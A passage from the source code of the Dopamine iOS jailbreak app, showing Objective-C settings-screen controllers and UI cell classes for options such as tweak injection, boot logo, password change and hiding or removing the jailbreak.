                    [reinstallPackageManagersSpecifier setProperty:@"reinstallPackageManagersPressed" forKey:@"action"];
                    [specifiers addObject:reinstallPackageManagersSpecifier];
                }
                if ((envManager.isJailbroken || envManager.isInstalledThroughTrollStore) && envManager.isBootstrapped) {
                    PSSpecifier *hideUnhideJailbreakSpecifier = [PSSpecifier preferenceSpecifierNamed:@"" target:self set:defSetter get:defGetter detail:nil cell:PSStaticTextCell edit:nil];
                    [hideUnhideJailbreakSpecifier setProperty:[DOButtonCell class] forKey:@"cellClass"];
                    [hideUnhideJailbreakSpecifier setProperty:buttonHeight forKey:@"height"];
                    if (envManager.isJailbreakHidden) {
                        [hideUnhideJailbreakSpecifier setProperty:@"Button_Unhide_Jailbreak" forKey:@"title"];
                        [hideUnhideJailbreakSpecifier setProperty:@"eye" forKey:@"image"];
                    }
                    else {
                        [hideUnhideJailbreakSpecifier setProperty:@"Button_Hide_Jailbreak" forKey:@"title"];
                        [hideUnhideJailbreakSpecifier setProperty:@"eye.slash" forKey:@"image"];
                    }
                    [hideUnhideJailbreakSpecifier setProperty:@"hideUnhideJailbreakPressed" forKey:@"action"];
                    BOOL hideJailbreakButtonShown = (envManager.isJailbroken || (envManager.isInstalledThroughTrollStore && envManager.isBootstrapped && !envManager.isJailbreakHidden));
                    if (hideJailbreakButtonShown) {
                        [specifiers addObject:hideUnhideJailbreakSpecifier];
                    }
                    
                    PSSpecifier *removeJailbreakSpecifier = [PSSpecifier preferenceSpecifierNamed:@"" target:self set:defSetter get:defGetter detail:nil cell:PSStaticTextCell edit:nil];
                    [removeJailbreakSpecifier setProperty:@"Button_Remove_Jailbreak" forKey:@"title"];
                    [removeJailbreakSpecifier setProperty:[DOButtonCell class] forKey:@"cellClass"];
                    [removeJailbreakSpecifier setProperty:buttonHeight forKey:@"height"];
                    [removeJailbreakSpecifier setProperty:@"trash" forKey:@"image"];
                    [removeJailbreakSpecifier setProperty:@"removeJailbreakPressed" forKey:@"action"];
                    if (hideJailbreakButtonShown) {
                        if (envManager.isJailbroken) {
                            [removeJailbreakSpecifier setProperty:DOLocalizedString(@"Hint_Hide_Jailbreak_Jailbroken") forKey:@"footerText"];
                        }
                        else {
                            [removeJailbreakSpecifier setProperty:DOLocalizedString(@"Hint_Hide_Jailbreak") forKey:@"footerText"];
                        }
                    }
                    [specifiers addObject:removeJailbreakSpecifier];
                }
            }
        }
        
        PSSpecifier *themingGroupSpecifier = [PSSpecifier emptyGroupSpecifier];
        themingGroupSpecifier.name = DOLocalizedString(@"Section_Customization");
        [specifiers addObject:themingGroupSpecifier];
        
        PSSpecifier *themeSpecifier = [PSSpecifier preferenceSpecifierNamed:DOLocalizedString(@"Theme") target:self set:defSetter get:defGetter detail:nil cell:PSLinkListCell edit:nil];
        themeSpecifier.detailControllerClass = [DOPSListItemsController class];
        [themeSpecifier setProperty:@YES forKey:@"enabled"];
        [themeSpecifier setProperty:@"theme" forKey:@"key"];
        [themeSpecifier setProperty:[[self themeIdentifiers] firstObject] forKey:@"default"];
        [themeSpecifier setProperty:@"themeIdentifiers" forKey:@"valuesDataSource"];
        [themeSpecifier setProperty:@"themeNames" forKey:@"titlesDataSource"];
        [specifiers addObject:themeSpecifier];

        PSSpecifier *bootlogoGropSpecifier = [PSSpecifier emptyGroupSpecifier];
        bootlogoGropSpecifier.name = DOLocalizedString(@"Section_Boot_Logo");
        [specifiers addObject:bootlogoGropSpecifier];

        PSSpecifier *bootlogoEnabledSpecifier = [PSSpecifier preferenceSpecifierNamed:DOLocalizedString(@"Enabled") target:self set:@selector(setBootlogoEnabled:specifier:) get:defGetter detail:nil cell:PSSwitchCell edit:nil];
        [bootlogoEnabledSpecifier setProperty:@YES forKey:@"enabled"];
        [bootlogoEnabledSpecifier setProperty:@"bootlogoEnabled" forKey:@"key"];
        [bootlogoEnabledSpecifier setProperty:@YES forKey:@"default"];
        bootlogoEnabledSpecifier.identifier = @"bootlogoEnabled";
        [specifiers addObject:bootlogoEnabledSpecifier];

        _customBootlogoEnabledSpecifier = [PSSpecifier preferenceSpecifierNamed:DOLocalizedString(@"Custom_Boot_Logo") target:self set:@selector(setCustomBootlogoEnabled:specifier:) get:defGetter detail:nil cell:PSSwitchCell edit:nil];
        [_customBootlogoEnabledSpecifier setProperty:@YES forKey:@"enabled"];
        [_customBootlogoEnabledSpecifier setProperty:@"customBootlogoEnabled" forKey:@"key"];
        [_customBootlogoEnabledSpecifier setProperty:@NO forKey:@"default"];
        _customBootlogoEnabledSpecifier.identifier = @"customBootlogoEnabled";

        _customBootlogoSpecifier = [PSSpecifier preferenceSpecifierNamed:DOLocalizedString(@"Select_Image") target:self set:defSetter get:defGetter detail:nil cell:PSButtonCell edit:nil];
        _customBootlogoSpecifier.buttonAction = @selector(selectCustomBootlogoPressed);
        [_customBootlogoSpecifier setProperty:@YES forKey:@"enabled"];
        [_customBootlogoSpecifier setProperty:@"customBootlogo" forKey:@"key"];
        _customBootlogoSpecifier.identifier = @"customBootlogo";

        if ([[DOPreferenceManager sharedManager] boolPreferenceValueForKey:@"bootlogoEnabled" fallback:YES]) {
            [specifiers addObject:_customBootlogoEnabledSpecifier];

            if ([[DOPreferenceManager sharedManager] boolPreferenceValueForKey:@"customBootlogoEnabled" fallback:NO]) {
                [specifiers addObject:_customBootlogoSpecifier];
            }
        }

        _specifiers = specifiers;
    }
    return _specifiers;
}

#pragma mark - Getters & Setters

- (void)setPreferenceValue:(id)value specifier:(PSSpecifier *)specifier
{
    NSString *key = [specifier propertyForKey:@"key"];
    [[DOPreferenceManager sharedManager] setPreferenceValue:value forKey:key];
}

- (id)readPreferenceValue:(PSSpecifier*)specifier
{
    NSString *key = [specifier propertyForKey:@"key"];
    id value = [[DOPreferenceManager sharedManager] preferenceValueForKey:key];
    if (!value) {
        return [specifier propertyForKey:@"default"];
    }
    return value;
}

- (id)readIDownloadEnabled:(PSSpecifier *)specifier
{
    DOEnvironmentManager *envManager = [DOEnvironmentManager sharedManager];
    if (envManager.isJailbroken) {
        return @([DOEnvironmentManager sharedManager].isIDownloadEnabled);
    }
    return [self readPreferenceValue:specifier];
}

- (void)setIDownloadEnabled:(id)value specifier:(PSSpecifier *)specifier
{
    [self setPreferenceValue:value specifier:specifier];
    DOEnvironmentManager *envManager = [DOEnvironmentManager sharedManager];
    if (envManager.isJailbroken) {
        [[DOEnvironmentManager sharedManager] setIDownloadLoaded:((NSNumber *)value).boolValue needsUnsandbox:YES];
    }
}

- (id)readTweakInjectionEnabled:(PSSpecifier *)specifier
{
    DOEnvironmentManager *envManager = [DOEnvironmentManager sharedManager];
    if (envManager.isJailbroken) {
        return @([DOEnvironmentManager sharedManager].isTweakInjectionEnabled);
    }
    return [self readPreferenceValue:specifier];
}

- (void)setTweakInjectionEnabled:(id)value specifier:(PSSpecifier *)specifier
{
    [self setPreferenceValue:value specifier:specifier];
    DOEnvironmentManager *envManager = [DOEnvironmentManager sharedManager];
    if (envManager.isJailbroken) {
        [[DOEnvironmentManager sharedManager] setTweakInjectionEnabled:((NSNumber *)value).boolValue];
        UIAlertController *userspaceRebootAlertController = [UIAlertController alertControllerWithTitle:DOLocalizedString(@"Alert_Tweak_Injection_Toggled_Title") message:DOLocalizedString(@"Alert_Tweak_Injection_Toggled_Body") preferredStyle:UIAlertControllerStyleAlert];
        UIAlertAction *rebootNowAction = [UIAlertAction actionWithTitle:DOLocalizedString(@"Alert_Tweak_Injection_Toggled_Reboot_Now") style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
            [[DOEnvironmentManager sharedManager] rebootUserspace];
        }];
        UIAlertAction *rebootLaterAction = [UIAlertAction actionWithTitle:DOLocalizedString(@"Alert_Tweak_Injection_Toggled_Reboot_Later") style:UIAlertActionStyleCancel handler:nil];
        
        [userspaceRebootAlertController addAction:rebootNowAction];
        [userspaceRebootAlertController addAction:rebootLaterAction];
        [self presentViewController:userspaceRebootAlertController animated:YES completion:nil];
    }
}

- (id)readAppJITEnabled:(PSSpecifier *)specifier
{
    DOEnvironmentManager *envManager = [DOEnvironmentManager sharedManager];
    if (envManager.isJailbroken) {
        bool v = jbclient_jbsettings_get_bool("markAppsAsDebugged");
        return @(v);
    }
    return [self readPreferenceValue:specifier];
}

- (void)setAppJITEnabled:(id)value specifier:(PSSpecifier *)specifier
{
    [self setPreferenceValue:value specifier:specifier];
    DOEnvironmentManager *envManager = [DOEnvironmentManager sharedManager];
    if (envManager.isJailbroken) {
        jbclient_platform_jbsettings_set_bool("markAppsAsDebugged", ((NSNumber *)value).boolValue);
    }
}

- (id)readJetsamMultiplier:(PSSpecifier *)specifier
{
    DOEnvironmentManager *envManager = [DOEnvironmentManager sharedManager];
    if (envManager.isJailbroken) {
        double v = jbclient_jbsettings_get_double("jetsamMultiplier");
        return @((v < 1 || isnan(v)) ? 6 : ceil(v * 2));
    }
    return [self readPreferenceValue:specifier];
}

- (void)setJetsamMultiplier:(id)value specifier:(PSSpecifier *)specifier
{
    [self setPreferenceValue:value specifier:specifier];
    DOEnvironmentManager *envManager = [DOEnvironmentManager sharedManager];
    if (envManager.isJailbroken) {
        jbclient_platform_jbsettings_set_double("jetsamMultiplier", ((NSNumber *)value).doubleValue / 2);
    }
}

- (void)setRemoveJailbreakEnabled:(id)value specifier:(PSSpecifier *)specifier
{
    [self setPreferenceValue:value specifier:specifier];
    if (((NSNumber *)value).boolValue) {
        UIAlertController *confirmationAlertController = [UIAlertController alertControllerWithTitle:DOLocalizedString(@"Alert_Remove_Jailbreak_Title") message:DOLocalizedString(@"Alert_Remove_Jailbreak_Enabled_Body") preferredStyle:UIAlertControllerStyleAlert];
        UIAlertAction *uninstallAction = [UIAlertAction actionWithTitle:DOLocalizedString(@"Button_Continue") style:UIAlertActionStyleDestructive handler:nil];
        UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:DOLocalizedString(@"Button_Cancel") style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
            [self setPreferenceValue:@NO specifier:specifier];
            [self reloadSpecifiers];
        }];
        [confirmationAlertController addAction:uninstallAction];
        [confirmationAlertController addAction:cancelAction];
        [self presentViewController:confirmationAlertController animated:YES completion:nil];
    }
}

- (void)setBootlogoEnabled:(id)value specifier:(PSSpecifier *)specifier
{
    bool prevValueBool = ((NSNumber *)[self readPreferenceValue:specifier]).boolValue;
    [self setPreferenceValue:value specifier:specifier];
    bool valueBool = ((NSNumber *)value).boolValue;

    if (prevValueBool != valueBool) {
        NSMutableArray *affectedSpecifiers = [NSMutableArray new];
        [affectedSpecifiers addObject:_customBootlogoEnabledSpecifier];

        if (valueBool == ![self containsSpecifier:_customBootlogoSpecifier]) {
            [affectedSpecifiers addObject:_customBootlogoSpecifier];
        }

        if (valueBool) {
            [self insertContiguousSpecifiers:affectedSpecifiers afterSpecifier:specifier animated:YES];
        }
        else {
            [self removeContiguousSpecifiers:affectedSpecifiers animated:YES];
        }
    }

    if ([DOEnvironmentManager sharedManager].isJailbroken) {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            [[DOEnvironmentManager sharedManager] updateBootLogo];
        });
    }
}

- (void)setCustomBootlogoEnabled:(id)value specifier:(PSSpecifier *)specifier
{
    bool prevValueBool = ((NSNumber *)[self readPreferenceValue:specifier]).boolValue;
    [self setPreferenceValue:value specifier:specifier];
    bool valueBool = ((NSNumber *)value).boolValue;

    if (prevValueBool != valueBool) {
        if (valueBool) {
            [self insertSpecifier:_customBootlogoSpecifier afterSpecifier:specifier animated:YES];
        }
        else {
            [self removeSpecifier:_customBootlogoSpecifier animated:YES];
        }
    }

    if ([DOEnvironmentManager sharedManager].isJailbroken) {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            [[DOEnvironmentManager sharedManager] updateBootLogo];
        });
    }
}

- (void)selectCustomBootlogoPressed
{
    PHAuthorizationStatus status = [PHPhotoLibrary authorizationStatus];
    if (status == PHAuthorizationStatusDenied || status == PHAuthorizationStatusRestricted) {
        return;
    } else if (status == PHAuthorizationStatusNotDetermined) {
        [PHPhotoLibrary requestAuthorization:^(PHAuthorizationStatus status) {
            if (status == PHAuthorizationStatusAuthorized) {
                dispatch_async(dispatch_get_main_queue(), ^{
                    [self selectCustomBootlogoPressed];
                });
            }
        }];
        return;
    }

    UIImagePickerController *picker = [[UIImagePickerController alloc] init];
    picker.delegate = self;
    picker.sourceType = UIImagePickerControllerSourceTypePhotoLibrary;
    [self presentViewController:picker animated:YES completion:nil];
}

#pragma mark - Boot Logo Picker

- (void)imagePickerController:(UIImagePickerController *)picker didFinishPickingMediaWithInfo:(NSDictionary<NSString *,id> *)info {
    UIImage *chosenImage = info[UIImagePickerControllerEditedImage];
    if (!chosenImage) {
        chosenImage = info[UIImagePickerControllerOriginalImage];
    }

    // Force correct the orientation
    // For some reason without rerendering the image, the stored file will have a wrong orientation for photos taken with the camera‚
    UIGraphicsBeginImageContextWithOptions(chosenImage.size, NO, 1.0);
    [chosenImage drawInRect:CGRectMake(0,0, chosenImage.size.width, chosenImage.size.height)];
    chosenImage = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();

    [UIImagePNGRepresentation(chosenImage) writeToFile:[DOUIManager sharedInstance].bootlogoPath atomically:YES];

    if ([DOEnvironmentManager sharedManager].isJailbroken) {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            [[DOEnvironmentManager sharedManager] updateBootLogo];
        });
    }

    [picker dismissViewControllerAnimated:YES completion:nil];
}

- (void)imagePickerControllerDidCancel:(UIImagePickerController *)picker {
    [picker dismissViewControllerAnimated:YES completion:nil];
}

#pragma mark - Button Actions

- (void)refreshJailbreakAppsPressed
{
    [[DOEnvironmentManager sharedManager] refreshJailbreakApps];
}

- (void)reinstallPackageManagersPressed
{
    [self.navigationController pushViewController:[[DOPkgManagerPickerViewController alloc] init] animated:YES];
}

- (void)changeMobilePasswordWithAuthenticationPressed
{
	LAContext *context = [[LAContext alloc] init];
	NSError *authError = nil;
	NSString *reason = DOLocalizedString(@"Password_Auth_Required");
	
	if ([context canEvaluatePolicy:LAPolicyDeviceOwnerAuthentication error:&authError]) {
		[context evaluatePolicy:LAPolicyDeviceOwnerAuthentication
			localizedReason:reason
			reply:^(BOOL success, NSError * _Nullable error) {
			dispatch_async(dispatch_get_main_queue(), ^{
				if (success) {
					[self changeMobilePassword];
				}
			});
		}];
	}
	else {
		[self changeMobilePassword];
	}
}

- (void)changeMobilePassword
{
    UIAlertController *changeMobilePasswordAlert = [UIAlertController alertControllerWithTitle:DOLocalizedString(@"Button_Change_Mobile_Password") message:DOLocalizedString(@"Alert_Change_Mobile_Password_Body") preferredStyle:UIAlertControllerStyleAlert];
    
    [changeMobilePasswordAlert addTextFieldWithConfigurationHandler:^(UITextField * _Nonnull textField) {
        textField.placeholder = DOLocalizedString(@"Password_Placeholder");
        textField.secureTextEntry = YES;
    }];
    
    [changeMobilePasswordAlert addTextFieldWithConfigurationHandler:^(UITextField * _Nonnull textField) {
        textField.placeholder = DOLocalizedString(@"Repeat_Password_Placeholder");
        textField.secureTextEntry = YES;
    }];
    
    UIAlertAction *changeButton = [UIAlertAction actionWithTitle:DOLocalizedString(@"Button_Change") style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action){
        NSString *password = changeMobilePasswordAlert.textFields[0].text;
        NSString *repeatPassword = changeMobilePasswordAlert.textFields[1].text;
        if (![password isEqualToString:repeatPassword]) {
            dispatch_async(dispatch_get_main_queue(), ^{
                [self changeMobilePassword];
            });
        }
        else {
            [[DOEnvironmentManager sharedManager] changeMobilePassword:password];
        }
    }];
    UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:DOLocalizedString(@"Button_Cancel") style:UIAlertActionStyleCancel handler:nil];
    [changeMobilePasswordAlert addAction:changeButton];
    [changeMobilePasswordAlert addAction:cancelAction];
    [self presentViewController:changeMobilePasswordAlert animated:YES completion:nil];
}

- (void)hideUnhideJailbreakPressed
{
    DOEnvironmentManager *envManager = [DOEnvironmentManager sharedManager];
    [envManager setJailbreakHidden:!envManager.isJailbreakHidden];
    [self reloadSpecifiers];
}

- (void)removeJailbreakPressed
{
    UIAlertController *confirmationAlertController = [UIAlertController alertControllerWithTitle:DOLocalizedString(@"Alert_Remove_Jailbreak_Title") message:DOLocalizedString(@"Alert_Remove_Jailbreak_Pressed_Body") preferredStyle:UIAlertControllerStyleAlert];
    UIAlertAction *uninstallAction = [UIAlertAction actionWithTitle:DOLocalizedString(@"Button_Continue") style:UIAlertActionStyleDestructive handler:^(UIAlertAction * _Nonnull action) {
        [[DOEnvironmentManager sharedManager] deleteBootstrap];
        if ([DOEnvironmentManager sharedManager].isJailbroken) {
            [[DOEnvironmentManager sharedManager] reboot];
        }
        else {
            if (gSystemInfo.jailbreakInfo.rootPath) {
                free(gSystemInfo.jailbreakInfo.rootPath);
                gSystemInfo.jailbreakInfo.rootPath = NULL;
                [[DOEnvironmentManager sharedManager] locateJailbreakRoot];
            }
            [self reloadSpecifiers];
        }
    }];
    UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:DOLocalizedString(@"Button_Cancel") style:UIAlertActionStyleDefault handler:nil];
    [confirmationAlertController addAction:uninstallAction];
    [confirmationAlertController addAction:cancelAction];
    [self presentViewController:confirmationAlertController animated:YES completion:nil];
}

- (void)resetSettingsPressed
{
    [[DOUIManager sharedInstance] resetSettings];
    [self.navigationController popToRootViewControllerAnimated:YES];
    [self reloadSpecifiers];
}


@end

```

`Application/Dopamine/UI/Settings/PSLists/DOPSExploitListItemsController.h`:

```h
//
//  DOPSExploitListItemsControllerViewController.h
//  Dopamine
//
//  Created by Lars Fröder on 29.04.24.
//

#import "DOPSListItemsController.h"

NS_ASSUME_NONNULL_BEGIN

@interface DOPSExploitListItemsController : DOPSListItemsController

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Settings/PSLists/DOPSExploitListItemsController.m`:

```m
//
//  DOPSExploitListItemsControllerViewController.m
//  Dopamine
//
//  Created by Lars Fröder on 29.04.24.
//

#import "DOPSExploitListItemsController.h"
#import "DOUIManager.h"

@interface DOPSExploitListItemsController ()

@end

@implementation DOPSExploitListItemsController

- (NSArray *)specifiers
{
    if (!_specifiers) {
        _specifiers = [super specifiers];
        NSString *recommendedIdentifier = [[self specifier] propertyForKey:@"recommendedExploitIdentifier"];
        for (PSSpecifier *specifier in _specifiers) {
            if ([specifier.identifier isEqualToString:recommendedIdentifier]) {
                specifier.name = [NSString stringWithFormat:@"%@ (%@)", specifier.name, DOLocalizedString(@"Recommended")];
            }
        }
    }
    return _specifiers;
}

@end

```

`Application/Dopamine/UI/Settings/PSLists/DOPSJetsamListItemsController.h`:

```h
//
//  DOPSExploitListItemsControllerViewController.h
//  Dopamine
//
//  Created by Lars Fröder on 29.04.24.
//

#import "DOPSListItemsController.h"

NS_ASSUME_NONNULL_BEGIN

@interface DOPSJetsamListItemsController : DOPSListItemsController

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Settings/PSLists/DOPSJetsamListItemsController.m`:

```m
//
//  DOPSExploitListItemsControllerViewController.m
//  Dopamine
//
//  Created by Lars Fröder on 29.04.24.
//

#import "DOPSJetsamListItemsController.h"
#import "DOUIManager.h"

@interface DOPSJetsamListItemsController ()

@end

@implementation DOPSJetsamListItemsController

- (NSArray *)specifiers
{
    if (!_specifiers) {
        _specifiers = [super specifiers];
        PSSpecifier *jetsamDescriptionSpecifier = [PSSpecifier emptyGroupSpecifier];
        [jetsamDescriptionSpecifier setProperty:DOLocalizedString(@"Jetsam_Description") forKey:@"footerText"];
        [(NSMutableArray *)_specifiers addObject:jetsamDescriptionSpecifier];
    }
    return _specifiers;
}

@end

```

`Application/Dopamine/UI/Settings/PSLists/DOPSListController.h`:

```h
//
//  DOPSListController.h
//  Dopamine
//
//  Created by tomt000 on 26/01/2024.
//

#import <UIKit/UIKit.h>
#import <Preferences/PSListController.h>
#import <Preferences/PSSpecifier.h>


NS_ASSUME_NONNULL_BEGIN

@interface DOPSListController : PSListController

+ (void)setupViewControllerStyle:(UIViewController*)vc;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Settings/PSLists/DOPSListController.m`:

```m
//
//  DOPSListController.m
//  Dopamine
//
//  Created by tomt000 on 26/01/2024.
//

#import "DOPSListController.h"
#import "DOThemeManager.h"

@interface DOPSListController ()

@end

@implementation DOPSListController

- (void)viewDidLoad {
    [super viewDidLoad];
    
    [_table setSeparatorColor:[UIColor clearColor]];
    [_table setBackgroundColor:[UIColor clearColor]];
    [DOPSListController setupViewControllerStyle:self];
}

+ (void)setupViewControllerStyle:(UIViewController*)vc
{
    DOTheme *theme = [[DOThemeManager sharedInstance] enabledTheme];
    
    vc.overrideUserInterfaceStyle = UIUserInterfaceStyleDark;
    vc.view.backgroundColor = theme.windowColor;
    vc.view.layer.cornerRadius = 16;
    vc.view.layer.masksToBounds = YES;
    vc.view.layer.cornerCurve = kCACornerCurveContinuous;
    [UISwitch appearanceWhenContainedInInstancesOfClasses:@[[vc class]]].onTintColor = [UIColor colorWithRed: 71.0/255.0 green: 169.0/255.0 blue: 135.0/255.0 alpha: 1.0];
}

- (void)tableView:(UITableView *)tableView willDisplayCell:(UITableViewCell *)cell forRowAtIndexPath:(NSIndexPath *)indexPath {
    cell.backgroundColor = [UIColor clearColor];
}

- (void)viewDidLayoutSubviews {
    [super viewDidLayoutSubviews];
    _table.frame = CGRectMake(12, 5, self.view.bounds.size.width - 24, self.view.bounds.size.height - 10);
}

#pragma mark - Status Bar

- (UIStatusBarStyle)preferredStatusBarStyle
{
    return UIStatusBarStyleLightContent;
}


@end

```

`Application/Dopamine/UI/Settings/PSLists/DOPSListItemsController.h`:

```h
//
//  DOPSListItemsController.h
//  Dopamine
//
//  Created by tomt000 on 26/01/2024.
//

#import <UIKit/UIKit.h>
#import <Preferences/PSListController.h>
#import <Preferences/PSSpecifier.h>


NS_ASSUME_NONNULL_BEGIN

@interface PSListItemsController : PSListController
- (id)itemsFromDataSource;
@end

@interface DOPSListItemsController : PSListItemsController

+ (UIView *)makeHeader:(NSString *)title withTarget:(id)target;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Settings/PSLists/DOPSListItemsController.m`:

```m
//
//  DOPSListItemsController.m
//  Dopamine
//
//  Created by tomt000 on 26/01/2024.
//

#import "DOPSListItemsController.h"
#import "DOPSListController.h"

@interface DOPSListItemsController ()

@end

@implementation DOPSListItemsController

- (void)viewDidLoad {
    [super viewDidLoad];
    
    [_table setSeparatorColor:[UIColor clearColor]];
    [_table setBackgroundColor:[UIColor clearColor]];
    [DOPSListController setupViewControllerStyle: self];
    
    _table.tableHeaderView = [DOPSListItemsController makeHeader: ((PSSpecifier*)self.specifier).name withTarget:self];
}

+ (UIView *)makeHeader:(NSString *)title withTarget:(id)target
{
    UIView *header = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 0, 70)];

    UILabel *label = [[UILabel alloc] initWithFrame:CGRectMake(0, 0, 0, 60)];
    label.text = title;
    label.font = [UIFont systemFontOfSize:17 weight:UIFontWeightMedium];
    label.textColor = [UIColor whiteColor];
    label.textAlignment = NSTextAlignmentCenter;
    label.translatesAutoresizingMaskIntoConstraints = NO;
    [header addSubview:label];

    UIView *border = [[UIView alloc] init];
    border.translatesAutoresizingMaskIntoConstraints = NO;
    border.backgroundColor = [UIColor colorWithWhite:1.0 alpha:0.1];
    [header addSubview:border];

    UIImage *backImage = [UIImage systemImageNamed:@"chevron.left" withConfiguration:[UIImageSymbolConfiguration configurationWithPointSize:20 weight:UIImageSymbolWeightMedium]];
    backImage = [backImage imageWithRenderingMode:UIImageRenderingModeAlwaysTemplate];
    UIButton *backButton = [UIButton buttonWithType:UIButtonTypeCustom];
    [backButton setImage:backImage forState:UIControlStateNormal];
    [backButton setTintColor:[UIColor colorWithWhite:1.0 alpha:0.6]];
    [backButton addTarget:target action:@selector(dismiss) forControlEvents:UIControlEventTouchUpInside];
    backButton.translatesAutoresizingMaskIntoConstraints = NO;
    [header addSubview:backButton];

    [NSLayoutConstraint activateConstraints:@[
        [label.centerYAnchor constraintEqualToAnchor:header.centerYAnchor constant:-8],
        [label.centerXAnchor constraintEqualToAnchor:header.centerXAnchor]
    ]];

    [NSLayoutConstraint activateConstraints:@[
        [border.leadingAnchor constraintEqualToAnchor:header.leadingAnchor constant:20],
        [border.trailingAnchor constraintEqualToAnchor:header.trailingAnchor constant:-20],
        [border.bottomAnchor constraintEqualToAnchor:header.bottomAnchor constant:-12],
        [border.heightAnchor constraintEqualToConstant:1]
    ]];

    [NSLayoutConstraint activateConstraints:@[
        [backButton.leadingAnchor constraintEqualToAnchor:header.leadingAnchor constant:10],
        [backButton.centerYAnchor constraintEqualToAnchor:header.centerYAnchor constant:-7],
        [backButton.widthAnchor constraintEqualToConstant:30],
        [backButton.heightAnchor constraintEqualToConstant:30]
    ]];

    return header;
}

- (void)dismiss {
    [self.navigationController popViewControllerAnimated:YES];
}

- (void)tableView:(UITableView *)tableView willDisplayCell:(UITableViewCell *)cell forRowAtIndexPath:(NSIndexPath *)indexPath {
    cell.backgroundColor = [UIColor clearColor];
}

- (void)viewDidLayoutSubviews {
    [super viewDidLayoutSubviews];
    _table.frame = CGRectMake(12, 5, self.view.bounds.size.width - 24, self.view.bounds.size.height - 10);
}

#pragma mark - Status Bar

- (UIStatusBarStyle)preferredStatusBarStyle
{
    return UIStatusBarStyleLightContent;
}


@end

```

`Application/Dopamine/UI/Settings/Specifiers/DOButtonCell.h`:

```h
//
//  DOButtonCell.h
//  Dopamine
//
//  Created by tomt000 on 26/01/2024.
//

#import <UIKit/UIKit.h>
#import <Preferences/PSTableCell.h>
#import <Preferences/PSSpecifier.h>

NS_ASSUME_NONNULL_BEGIN

@interface DOButtonCell : PSTableCell

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Settings/Specifiers/DOButtonCell.m`:

```m
//
//  DOButtonCell.m
//  Dopamine
//
//  Created by tomt000 on 26/01/2024.
//

#import "DOButtonCell.h"
#import "DOActionMenuButton.h"
#import "DOGlobalAppearance.h"
#import "DOUIManager.h"

@implementation DOButtonCell

- (id)initWithStyle:(long long)arg1 reuseIdentifier:(id)arg2 specifier:(PSSpecifier *)specifier
{
    self = [super init];
    if (self)
    {
        UIAction *action = [UIAction actionWithTitle:DOLocalizedString([specifier propertyForKey:@"title"]) image:[UIImage systemImageNamed:[specifier propertyForKey:@"image"] withConfiguration:[DOGlobalAppearance smallIconImageConfiguration]] identifier:[specifier propertyForKey:@"key"] handler:^(__kindof UIAction * _Nonnull action) {
            SEL selector = NSSelectorFromString([specifier propertyForKey:@"action"]);
            if ([[specifier target] respondsToSelector:selector]) {
                [[specifier target] performSelector:selector withObject:specifier];
            }
        }];

        DOActionMenuButton *button = [DOActionMenuButton buttonWithAction:action chevron:NO];

        button.translatesAutoresizingMaskIntoConstraints = NO;
        [button setContentHorizontalAlignment:UIControlContentHorizontalAlignmentCenter];
        button.layer.cornerRadius = 10;
        button.layer.masksToBounds = YES;
        button.layer.cornerCurve = kCACornerCurveContinuous;
        button.layer.borderWidth = 1;
        button.layer.borderColor = [UIColor colorWithWhite:1 alpha:0.15].CGColor;

        [self.contentView addSubview:button];

        [NSLayoutConstraint activateConstraints:@[
            [button.leadingAnchor constraintEqualToAnchor:self.leadingAnchor constant:20],
            [button.trailingAnchor constraintEqualToAnchor:self.trailingAnchor constant:-20],
            [button.topAnchor constraintEqualToAnchor:self.topAnchor constant:4],
            [button.bottomAnchor constraintEqualToAnchor:self.bottomAnchor constant:-4],
        ]];
    }
    return self;
}

@end

```

`Application/Dopamine/UI/Settings/Specifiers/DOCreditsCell.h`:

```h
//
//  DOCreditsCell.h
//  Dopamine
//
//  Created by tomt000 on 26/01/2024.
//

#import <UIKit/UIKit.h>
#import <Preferences/PSTableCell.h>
#import <Preferences/PSSpecifier.h>

NS_ASSUME_NONNULL_BEGIN

@interface DOCreditsCell : UITableViewCell

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Settings/Specifiers/DOCreditsCell.m`:

```m
//
//  DOCreditsCell.m
//  Dopamine
//
//  Created by tomt000 on 26/01/2024.
//

#import "DOCreditsCell.h"
#import "DOGlobalAppearance.h"

#define CREDITS_CELL_HEIGHT 35

@interface DOCreditsCellItem : UICollectionViewCell
@property (nonatomic, strong) UILabel *label;
@property (nonatomic, strong) NSURL *url;
@end

@implementation DOCreditsCellItem

- (id)initWithFrame:(CGRect)frame
{
    if (self = [super initWithFrame:frame])
    {
        self.label = [[UILabel alloc] init];
        self.label.translatesAutoresizingMaskIntoConstraints = NO;
        self.label.font = [UIFont systemFontOfSize:14 weight:UIFontWeightRegular];
        self.label.textColor = [UIColor whiteColor];
        self.label.alpha = 0.65;
        self.label.textAlignment = NSTextAlignmentLeft;

        [self.contentView addSubview:self.label];
        [NSLayoutConstraint activateConstraints:@[
            [self.label.centerXAnchor constraintEqualToAnchor:self.contentView.centerXAnchor constant:-17 * ([DOGlobalAppearance isRTL] ? -1 : 1)],
            [self.label.centerYAnchor constraintEqualToAnchor:self.contentView.centerYAnchor],
        ]];

        UIImage *chevronImage = [UIImage systemImageNamed:@"chevron.right"];
        chevronImage = [chevronImage imageWithConfiguration:[UIImageSymbolConfiguration configurationWithPointSize:14 weight:UIImageSymbolWeightRegular]];
        UIImageView *chevronView = [[UIImageView alloc] initWithImage:chevronImage];
        chevronView.translatesAutoresizingMaskIntoConstraints = NO;
        chevronView.tintColor = [UIColor colorWithWhite:1 alpha:self.label.alpha];
